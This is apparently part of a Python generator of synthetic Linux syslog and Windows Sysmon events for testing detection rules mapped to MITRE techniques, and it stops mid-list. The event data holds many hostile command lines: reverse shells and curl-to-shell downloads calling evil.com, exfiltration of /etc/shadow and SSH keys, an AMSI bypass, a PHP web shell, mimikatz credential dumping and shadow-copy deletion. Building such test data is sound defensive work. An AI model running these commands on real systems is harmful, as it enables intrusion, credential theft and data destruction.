        "nsenter -t 1 -m -u -i -n -p -- /bin/bash",
        "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
        "mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release",
        "echo '/path/to/payload' > /proc/sys/kernel/core_pattern",
    ]
    for i, cmd in enumerate(container_escapes):
        events.append(linux_event("bash", cmd, host="k8s-worker-03",
            offset=200+i, facility="syslog"))

    # ── LD_PRELOAD Hijacking ──
    ld_preload_cmds = [
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        "echo '/tmp/rootkit.so' >> /etc/ld.so.preload",
        "sed -i '1i /tmp/evil.so' /etc/ld.so.preload",
    ]
    for i, cmd in enumerate(ld_preload_cmds):
        events.append(linux_event("bash", cmd, offset=210+i, facility="syslog"))

    # ── Kernel Module from Temp Directory ──
    kernel_module_cmds = [
        "insmod /tmp/rootkit.ko",
        "insmod /dev/shm/hidden_module.ko",
        "insmod /var/tmp/persistence.ko",
    ]
    for i, cmd in enumerate(kernel_module_cmds):
        events.append(linux_event("insmod", cmd, offset=220+i, facility="syslog"))

    # ── Password File Direct Modification ──
    passwd_cmds = [
        "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "tee -a /etc/passwd <<< 'eviluser:x:0:0::/root:/bin/bash'",
        "sed -i 's/root:x/root::/g' /etc/shadow",
        "echo 'backdoor::0:0::/:/bin/sh' > /etc/passwd",
    ]
    for i, cmd in enumerate(passwd_cmds):
        events.append(linux_event("bash", cmd, offset=230+i, facility="syslog"))

    # ── Process Injection via Ptrace ──
    ptrace_cmds = [
        "strace -p 1234 -o /tmp/trace.log",
        "gdb -p 5678 -batch -ex 'call system(\"/bin/sh\")'",
        "gdb --pid 9012 -batch -ex 'print (int)ptrace(PTRACE_ATTACH,1234,0,0)'",
    ]
    for i, cmd in enumerate(ptrace_cmds):
        events.append(linux_event("bash", cmd, offset=240+i, facility="syslog"))

    # ── Suspicious Network Traffic Redirect ──
    redirect_cmds = [
        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443",
        "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080",
        "iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT",
        "nft add rule ip nat prerouting tcp dport 443 dnat to 10.0.0.2:8443",
    ]
    for i, cmd in enumerate(redirect_cmds):
        events.append(linux_event("bash", cmd, offset=250+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Systemd Service Persistence ──
    systemd_cmds = [
        "systemctl enable /etc/systemd/system/evil-backdoor.service",
        "systemctl daemon-reload && systemctl start evil-backdoor.service",
        "cp /tmp/evil.service /etc/systemd/system/persistence.service && systemctl enable persistence.service",
    ]
    for i, cmd in enumerate(systemd_cmds):
        events.append(linux_event("bash", cmd, offset=300+i, facility="syslog"))

    # ── SSH Tunneling ──
    ssh_tunnel_cmds = [
        "ssh -L 8080:internal-db:3306 admin@bastion-01",
        "ssh -R 9090:localhost:22 attacker@evil.com",
        "ssh -D 1080 -N -f admin@jump-host",
        "autossh -M 0 -N -f -L 3389:dc01:3389 compromised@pivot",
    ]
    for i, cmd in enumerate(ssh_tunnel_cmds):
        events.append(linux_event("ssh", cmd, offset=310+i, facility="auth"))

    # ── Suspicious Download to /tmp ──
    download_cmds = [
        ("wget", "wget http://evil.com/backdoor.elf -O /tmp/updater"),
        ("curl", "curl -o /tmp/payload http://185.220.101.1/shell.sh"),
        ("wget", "wget -q http://c2.attacker.org/stage2 -O /tmp/s2"),
        ("curl", "curl http://evil.com/miner -o /tmp/xmrig"),
    ]
    for i, (proc, cmd) in enumerate(download_cmds):
        events.append(linux_event(proc, cmd, offset=320+i, facility="syslog"))

    # ── Process Execution from /dev/shm ──
    devshm_cmds = [
        "/dev/shm/reverse_shell",
        "chmod +x /dev/shm/miner && /dev/shm/miner",
        "bash /dev/shm/payload.sh",
    ]
    for i, cmd in enumerate(devshm_cmds):
        events.append(linux_event("bash", cmd, offset=330+i, facility="syslog"))

    # ── Sudoers Modification ──
    sudoers_cmds = [
        "visudo -f /etc/sudoers.d/backdoor",
        "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "cp /tmp/evil-sudoers /etc/sudoers.d/admin-override",
    ]
    for i, cmd in enumerate(sudoers_cmds):
        events.append(linux_event("bash", cmd, offset=340+i, facility="syslog"))

    # ── Shell Profile Persistence ──
    profile_cmds = [
        "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc",
        "echo '/tmp/backdoor &' >> /etc/profile.d/startup.sh",
        "echo 'nohup /tmp/miner &' >> ~/.bash_profile",
        "echo 'export PATH=/tmp/evil:$PATH' >> /etc/bash.bashrc",
    ]
    for i, cmd in enumerate(profile_cmds):
        events.append(linux_event("bash", cmd, offset=350+i, facility="syslog"))

    # ── At Job Scheduled ──
    at_cmds = [
        "at -f /tmp/payload.sh now + 5 minutes",
        "echo '/tmp/backdoor' | at midnight",
    ]
    for i, cmd in enumerate(at_cmds):
        events.append(linux_event("at", cmd, offset=360+i, facility="cron"))
    events.append(linux_event("batch", "batch < /tmp/commands.sh",
        offset=362, facility="cron"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Linux Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── DNS Tunneling ──
    dns_tunnel_cmds = [
        "iodine -f 10.0.0.1 tunnel.evil.com",
        "dns2tcp -z evil.com -r ssh -l 127.0.0.1 -p 2222",
        "dnscat --dns server=attacker.com --secret=s3cr3t",
    ]
    for i, cmd in enumerate(dns_tunnel_cmds):
        events.append(linux_event("bash", cmd, offset=400+i, facility="syslog"))

    # ── Hosts File Modification ──
    hosts_cmds = [
        "echo '10.0.0.1 updates.microsoft.com' >> /etc/hosts",
        "sed -i 's/nameserver .*/nameserver 185.220.101.1/' /etc/resolv.conf",
    ]
    for i, cmd in enumerate(hosts_cmds):
        events.append(linux_event("bash", cmd, offset=410+i, facility="syslog"))

    # ── Process Memory Access via /proc ──
    proc_cmds = [
        "cat /proc/self/environ | tr '\\0' '\\n' | grep PASSWORD",
        "cat /proc/1234/maps",
        "dd if=/proc/5678/mem of=/tmp/memdump bs=1 skip=4096 count=65536",
        "cat /proc/self/maps | grep heap",
    ]
    for i, cmd in enumerate(proc_cmds):
        events.append(linux_event("bash", cmd, offset=420+i, facility="syslog"))

    # ── Web Shell Creation ──
    webshell_cmds = [
        "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/cmd.php",
        "cp /tmp/shell.jsp /var/www/cgi-bin/upload.jsp",
        "curl -o /usr/share/nginx/html/backdoor.php http://evil.com/shell.php",
    ]
    for i, cmd in enumerate(webshell_cmds):
        events.append(linux_event("bash", cmd, offset=430+i, facility="syslog"))

    # ── Cryptominer Activity ──
    miner_cmds = [
        "./xmrig --url stratum+tcp://pool.minexmr.com:4444 --user wallet123 --donate-level 1",
        "cpuminer -a cryptonight -o stratum+ssl://xmr.pool.com:443",
        "/tmp/.hidden/minerd -a scrypt -o stratum+tcp://ltc.pool.com:3333",
    ]
    for i, cmd in enumerate(miner_cmds):
        events.append(linux_event("bash", cmd, offset=440+i, facility="syslog"))

    # ── Log File Tampering ──
    log_tamper_cmds = [
        "rm -f /var/log/auth.log",
        "truncate -s 0 /var/log/syslog",
        "cat /dev/null > /var/log/wtmp",
        "shred /var/log/secure",
        "journalctl --vacuum-time=1s",
    ]
    for i, cmd in enumerate(log_tamper_cmds):
        events.append(linux_event("bash", cmd, offset=450+i, facility="syslog"))

    # ── Post-Exploitation Enumeration Scripts ──
    enum_cmds = [
        "curl -L http://evil.com/linpeas.sh | bash",
        "wget http://evil.com/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh",
        "./linux-exploit-suggester.sh",
        "./pspy64 -f",
    ]
    for i, cmd in enumerate(enum_cmds):
        events.append(linux_event("bash", cmd, offset=460+i, facility="syslog"))

    # ── Bind Shell Listener ──
    bind_cmds = [
        "nc -lvp 4444",
        "ncat -lvp 8080 -e /bin/bash",
        "ncat -lp 443 --ssl -e /bin/sh",
        "socat TCP-LISTEN:9090,reuseaddr,fork EXEC:/bin/sh,pty,stderr",
    ]
    for i, cmd in enumerate(bind_cmds):
        events.append(linux_event("bash", cmd, offset=470+i, facility="syslog"))

    # ── Suspicious Cron Job Content ──
    cron_cmds = [
        "echo '*/5 * * * * curl http://evil.com/update|sh' >> /etc/cron.d/update",
        "echo '0 * * * * wget http://c2.attacker.org/payload|bash' > /var/spool/cron/root",
        "echo '*/10 * * * * echo YmFzaCAtaQ== | base64 -d | bash' >> /etc/cron.d/hidden",
    ]
    for i, cmd in enumerate(cron_cmds):
        events.append(linux_event("bash", cmd, offset=480+i, facility="syslog"))

    # ── Hidden File Creation in Suspicious Locations ──
    hidden_cmds = [
        "mkdir /tmp/.X11-unix-bak && cp /tmp/payload /tmp/.X11-unix-bak/",
        "cp /tmp/miner /dev/shm/.hidden_miner",
        "echo '#!/bin/bash' > /var/tmp/.update.sh",
        "mkdir -p /run/lock/.cache && mv /tmp/rootkit /run/lock/.cache/",
    ]
    for i, cmd in enumerate(hidden_cmds):
        events.append(linux_event("bash", cmd, offset=490+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Linux Events
    # ═══════════════════════════════════════════════════════════════

    # ── Network Service Scanning (T1046) ──
    scan_cmds = [
        ("nmap", "nmap -sV -p 1-1024 192.168.1.0/24"),
        ("nmap", "nmap -sS -p 22,80,443,3306,5432 10.0.0.0/24"),
        ("masscan", "masscan -p 1-65535 --rate 1000 192.168.0.0/16"),
        ("zmap", "zmap -p 443 -B 10M -o results.csv"),
    ]
    for i, (proc, cmd) in enumerate(scan_cmds):
        events.append(linux_event(proc, cmd, offset=550+i, facility="syslog"))

    # ── System Owner/User Discovery (T1033) ──
    discovery_cmds = [
        "w ",
        "who -a",
        "last -a",
        "lastlog",
        "getent passwd",
        "cat /etc/group",
    ]
    for i, cmd in enumerate(discovery_cmds):
        events.append(linux_event("bash", cmd, offset=560+i, facility="syslog"))

    # ── External Remote Service Abuse (T1133) ──
    events.append(linux_event("sshd",
        "Accepted password for admin from 45.33.32.156 port 52345 ssh2",
        offset=570, facility="auth"))
    events.append(linux_event("bash",
        "openvpn --config /tmp/attacker.ovpn",
        offset=571, facility="syslog"))
    events.append(linux_event("bash",
        "xfreerdp /v:internal-dc.corp.local /u:admin /p:P@ssw0rd",
        offset=572, facility="syslog"))

    # ── Exfiltration Over Alternative Protocol (T1048) ──
    exfil_cmds = [
        "cat /etc/shadow | nc 185.220.101.1 9999",
        "tar czf - /home/ | ncat 45.33.32.156 8080",
        "scp -r /etc/ attacker@185.220.101.1:/loot/",
        "cat /root/.ssh/id_rsa | curl -X POST http://evil.com/collect -d @-",
    ]
    for i, cmd in enumerate(exfil_cmds):
        events.append(linux_event("bash", cmd, offset=580+i, facility="syslog"))

    # ── Archive Collected Data (T1560.001) ──
    archive_cmds = [
        "tar -czf /tmp/loot.tar.gz /etc/passwd /etc/shadow /root/.ssh/",
        "zip -r /dev/shm/data.zip /home/ /var/www/html/",
        "tar czf /var/tmp/backup.tar.gz /opt/application/config/",
    ]
    for i, cmd in enumerate(archive_cmds):
        events.append(linux_event("bash", cmd, offset=590+i, facility="syslog"))

    # ── Sensitive Data Access (T1005) ──
    data_access_cmds = [
        "cat /root/.ssh/id_rsa",
        "cat /home/admin/.oci/config",
        "cat /home/deploy/.aws/credentials",
        "cat /var/www/html/.env",
        "cat /opt/app/database.yml",
    ]
    for i, cmd in enumerate(data_access_cmds):
        events.append(linux_event("bash", cmd, offset=600+i, facility="syslog"))

    # ── Proxy/Tunneling Tools (T1090) ──
    proxy_cmds = [
        "chisel client 185.220.101.1:8080 R:socks",
        "chisel server --port 8080 --reverse",
        "frpc -c /tmp/frpc.ini",
        "proxychains4 ssh admin@internal-host",
    ]
    for i, cmd in enumerate(proxy_cmds):
        events.append(linux_event("bash", cmd, offset=610+i, facility="syslog"))

    # ── Encrypted Channel C2 (T1573) ──
    encrypted_cmds = [
        "openssl s_client -connect c2.evil.com:443",
        "ncat --ssl -e /bin/sh 185.220.101.1 443",
        "socat openssl-connect:evil.com:443,cert=/tmp/cert.pem EXEC:/bin/bash",
        "ssh -fNR 9090:localhost:22 attacker@evil.com",
    ]
    for i, cmd in enumerate(encrypted_cmds):
        events.append(linux_event("bash", cmd, offset=620+i, facility="syslog"))

    # ── Setuid Binary Creation (T1548.001) ──
    suid_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /tmp/backdoor",
        "chmod 4755 /tmp/root_shell",
        "chmod 6755 /var/tmp/persistence",
    ]
    for i, cmd in enumerate(suid_cmds):
        events.append(linux_event("bash", cmd, offset=630+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── SSH Brute Force: 15 failures from one IP to trigger frequency threshold ──
    attacker_brute_ip = "91.92.109.18"
    for i in range(15):
        events.append(linux_event("sshd",
            f"Failed password for root from {attacker_brute_ip} port {40000+i} ssh2",
            host="web-prod-01", offset=500+i))

    # ── Multi-Stage Attack on Single Host (same host: recon → access → persist) ──
    target_host = "app-prod-02"
    # Stage 1: Initial access (SSH brute force)
    for i in range(5):
        events.append(linux_event("sshd",
            f"Failed password for admin from 185.220.101.1 port {50000+i} ssh2",
            host=target_host, offset=520+i))
    # Stage 2: Successful login followed by downloads
    events.append(linux_event("sshd",
        "Accepted password for admin from 185.220.101.1 port 50005 ssh2",
        host=target_host, offset=526))
    events.append(linux_event("bash",
        "curl -o /tmp/payload http://evil.com/stage2.sh",
        host=target_host, offset=527, facility="syslog"))
    events.append(linux_event("bash",
        "wget http://c2.attacker.org/persist -O /tmp/persist.sh",
        host=target_host, offset=528, facility="syslog"))
    # Stage 3: Persistence
    events.append(linux_event("bash",
        "echo 'ssh-rsa AAAA... attacker@evil' >> /home/admin/.ssh/authorized_keys",
        host=target_host, offset=529, facility="syslog"))
    events.append(linux_event("bash",
        "echo '*/5 * * * * curl http://evil.com/beacon|sh' >> /etc/cron.d/update",
        host=target_host, offset=530, facility="syslog"))
    events.append(linux_event("bash",
        "systemctl enable /etc/systemd/system/backdoor.service",
        host=target_host, offset=531, facility="syslog"))
    # Stage 4: Credential access
    events.append(linux_event("bash",
        "cat /etc/shadow",
        host=target_host, offset=532, facility="syslog"))
    events.append(linux_event("bash",
        "cat /etc/passwd",
        host=target_host, offset=533, facility="syslog"))

    # ── Persistence Score: Multiple persistence mechanisms on one host ──
    persist_host = "bastion-01"
    persist_cmds = [
        ("bash", "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc"),
        ("crontab", "(admin) REPLACE (root) crontab"),
        ("bash", "systemctl enable /etc/systemd/system/evil-backdoor.service"),
        ("bash", "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"),
        ("bash", "echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
        ("at", "at -f /tmp/payload.sh now + 5 minutes"),
    ]
    for i, (proc, cmd) in enumerate(persist_cmds):
        events.append(linux_event(proc, cmd, host=persist_host,
            offset=540+i, facility="syslog"))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Windows Sysmon Event Generators
# ═══════════════════════════════════════════════════════════════════

def sysmon_event(event_id, image, command_line, host=None, user=None,
                 parent_image="C:\\Windows\\explorer.exe",
                 target_image=None, target_filename=None, target_object=None,
                 granted_access=None, dest_hostname=None, dest_ip=None,
                 pipe_name=None, msg=None, offset=0, **extra):
    """Generate a Windows Sysmon Event 1 style JSON event.

    Uses OCI Log Analytics field names (e.g. 'Process Name', 'Command Line')
    so that the Upload API auto-maps them to LA fields for query/dashboard use.
    Also retains Sysmon-native names (Image, CommandLine) for parser compatibility.
    """
    if host is None:
        host = random.choice(WINDOWS_HOSTS)
    if user is None:
        user = random.choice(WINDOWS_USERS)
    event_time = ts(offset)
    current_directory = ntpath.dirname(image) + "\\"
    original_name = ntpath.basename(image)
    parent_cmd = extra.pop("ParentCommandLine", ntpath.basename(parent_image))
    event = {
        # OCI Log Analytics mapped fields (used by OCL queries)
        "Event ID": event_id,
        "Process Name": image,
        "Command Line": command_line,
        "Parent Process Name": parent_image,
        "Parent Command Line": parent_cmd,
        "Host Name (Server)": host,
        "Original File Name": original_name,
        "Integrity Level": random.choice(["System", "High", "Medium"]),
        "Logon ID": hex(random.randint(0x3E4, 0xFFF)),
        "Terminal Session ID": random.choice([0, 1, 2, 3, 10]),
        # Sysmon-native fields (for raw reference / parser fallback)
        "EventID": event_id,
        "TimeCreated": event_time,
        "UtcTime": event_time,
        "Computer": host,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "User": user,
        "ProcessId": random.randint(100, 9999),
        "ProcessGuid": windows_guid(),
        "Image": image,
        "CommandLine": command_line,
        "CurrentDirectory": current_directory,
        "FileVersion": "10.0.0.0",
        "Description": f"{original_name} process",
        "Product": "Microsoft Windows Operating System",
        "Company": "Microsoft Corporation",
        "OriginalFileName": original_name,
        "Hashes": (
            f"SHA1={(uuid.uuid4().hex + uuid.uuid4().hex)[:40].upper()},"
            f"MD5={uuid.uuid4().hex.upper()},"
            f"SHA256={(uuid.uuid4().hex + uuid.uuid4().hex)[:64].upper()}"
        ),
        "LogonGuid": windows_guid(),
        "LogonId": hex(random.randint(0x3E4, 0xFFF)),
        "TerminalSessionId": random.choice([0, 1, 2, 3, 10]),
        "IntegrityLevel": random.choice(["System", "High", "Medium"]),
        "ParentProcessGuid": windows_guid(),
        "ParentProcessId": random.randint(100, 9999),
        "ParentImage": parent_image,
        "ParentCommandLine": parent_cmd,
        "SourceImage": image,
        "TargetImage": target_image or "",
        "TargetFilename": target_filename or "",
        "TargetObject": target_object or "",
        "GrantedAccess": granted_access or "",
        "DestinationHostname": dest_hostname or "",
        "DestinationIp": dest_ip or "",
        "PipeName": pipe_name or "",
        # OCI LA mapped duplicates
        "Source Process": image,
        "Target Process": target_image or "",
        "Target Filename": target_filename or "",
        "Target Object": target_object or "",
        "Granted Access": granted_access or "",
        "Destination Hostname": dest_hostname or "",
        "Destination IP": dest_ip or "",
        "Pipe Name": pipe_name or "",
        "msg": msg or f"Sysmon event {event_id}: {ntpath.basename(image)}",
    }
    event.update(extra)
    return event


def generate_windows_events():
    """Generate Windows Sysmon events covering all 24 Windows rules."""
    events = []

    # ── LOLBins (20 rules) ──
    lolbins = {
        "at.exe": "at 12:00 /every:M,T,W,Th,F C:\\Temp\\payload.exe",
        "bitsadmin.exe": "bitsadmin /transfer myJob /download http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "certutil.exe": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "cmd.exe": "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "cscript.exe": "cscript.exe C:\\Temp\\evil.vbs",
        "ipconfig.exe": "ipconfig /all",
        "mshta.exe": "mshta.exe http://evil.com/payload.hta",
        "net.exe": "net user backdoor P@ssw0rd /add",
        "net1.exe": "net1 user backdoor P@ssw0rd /add",
        "powershell.exe": "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "regsvr32.exe": "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
        "rundll32.exe": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "sc.exe": "sc create evilsvc binPath= C:\\Temp\\backdoor.exe start= auto",
        "schtasks.exe": "schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe",
        "systeminfo.exe": "systeminfo",
        "taskkill.exe": "taskkill /F /IM defender.exe",
        "tasklist.exe": "tasklist /svc",
        "whoami.exe": "whoami /all",
        "wmic.exe": "wmic process call create 'C:\\Temp\\payload.exe'",
        "wscript.exe": "wscript.exe C:\\Temp\\evil.vbs",
    }
    for i, (binary, cmd) in enumerate(lolbins.items()):
        for j in range(2):
            events.append(sysmon_event(
                event_id=1,
                image=f"C:\\Windows\\System32\\{binary}",
                command_line=cmd,
                parent_image="C:\\Windows\\System32\\cmd.exe",
                offset=i*3+j,
            ))

    bluelight_sequences = [
        (
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c powershell.exe -NoProfile -Command Get-WmiObject Win32_ComputerSystem",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            180,
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command [Convert]::FromBase64String('QQBDAFQA')",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            181,
        ),
    ]
    for image, command_line, parent_image, offset in bluelight_sequences:
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=command_line,
            parent_image=parent_image,
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            offset=offset,
        ))

    # ── Certutil Download/Decode (new rule) ──
    certutil_cmds = [
        "certutil -urlcache -split -f http://malware.example.com/payload.exe C:\\Temp\\payload.exe",
        "certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\malware.exe",
        "certutil -decodehex C:\\Temp\\hex.txt C:\\Temp\\binary.exe",
    ]
    for i, cmd in enumerate(certutil_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\certutil.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=200+i,
        ))

    # ── Encoded PowerShell Execution (new rule) ──
    ps_cmds = [
        "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
        "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "powershell.exe -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ==",
        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA",
    ]
    for i, cmd in enumerate(ps_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=210+i,
        ))

    # ── Service Creation via SC (new rule) ──
    sc_cmds = [
        'sc create evilsvc binPath= "C:\\Temp\\backdoor.exe" start= auto',
        'sc.exe create persistence binPath= C:\\Windows\\Temp\\svc.exe',
    ]
    for i, cmd in enumerate(sc_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\sc.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="NT AUTHORITY\\SYSTEM",
            offset=220+i,
        ))

    # ── Credential Dumping via Procdump (new rule) ──
    # sel1: procdump + lsass
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump.exe",
        command_line="procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=230,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump64.exe",
        command_line="procdump64.exe -accepteula -ma lsass.exe out.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=231,
    ))
    # sel2: any process writing lsass.dmp
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\dumper.exe",
        command_line="C:\\Tools\\dumper.exe --output lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=232,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Shadow Copy Deletion (Ransomware) ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=300,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin Delete Shadows /for=C: /all",
        parent_image="C:\\malware\\ransomware.exe",
        offset=301,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic shadowcopy delete",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=302,
    ))

    # ── AMSI Bypass ──
    amsi_cmds = [
        "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "powershell.exe -c $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiContext','NonPublic,Static')",
        "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/amsi.dll')",
    ]
    for i, cmd in enumerate(amsi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=310+i,
        ))

    # ── WMI Persistence ──
    wmi_cmds = [
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='EvilFilter', EventNamespace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent'",
        "powershell.exe Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='EvilConsumer';CommandLineTemplate='C:\\Temp\\payload.exe'}",
        "powershell.exe Register-WmiEvent -Namespace root\\cimv2 -Query 'SELECT * FROM Win32_ProcessStartTrace' -Action {C:\\Temp\\payload.exe}",
        "powershell.exe New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root\\subscription",
    ]
    for i, cmd in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=320+i,
        ))

    # ── Registry Run Key Modification ──
    reg_cmds = [
        'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v EvilPersistence /t REG_SZ /d "C:\\Temp\\backdoor.exe" /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Updater /t REG_SZ /d "C:\\Temp\\payload.exe" /f',
        'powershell.exe New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Evil -Value "C:\\Temp\\evil.exe"',
    ]
    for i, cmd in enumerate(reg_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\reg.exe" if cmd.startswith("reg") else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=330+i,
        ))

    # ── DLL Side-Loading from Suspicious Path ──
    sideload_cmds = [
        ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain"),
        ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s C:\\Users\\analyst\\AppData\\Local\\Temp\\malware.dll"),
        ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i C:\\Users\\analyst\\Downloads\\trojan.msi /quiet"),
    ]
    for i, (image, cmd) in enumerate(sideload_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=340+i,
        ))

    # ── BCDEdit Recovery Disable (Ransomware) ──
    bcd_cmds = [
        "bcdedit.exe /set {default} recoveryenabled no",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    ]
    for i, cmd in enumerate(bcd_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\bcdedit.exe",
            command_line=cmd,
            parent_image="C:\\malware\\ransomware.exe",
            offset=350+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Mimikatz Execution Patterns ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=400,
    ))
    mimikatz_cmdlines = [
        "C:\\Tools\\mimi.exe sekurlsa::wdigest",
        "C:\\Tools\\procdump.exe lsadump::sam",
        "powershell.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
        "C:\\Temp\\katz.exe privilege::debug token::elevate",
    ]
    for i, cmd in enumerate(mimikatz_cmdlines):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\mimikatz.exe" if "mimi" in cmd or "katz" in cmd else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=401+i,
        ))

    # ── Firewall Rule Modification ──
    fw_cmds = [
        "netsh advfirewall firewall add rule name=EvilRule dir=in action=allow protocol=tcp localport=4444",
        "netsh advfirewall set allprofiles state off",
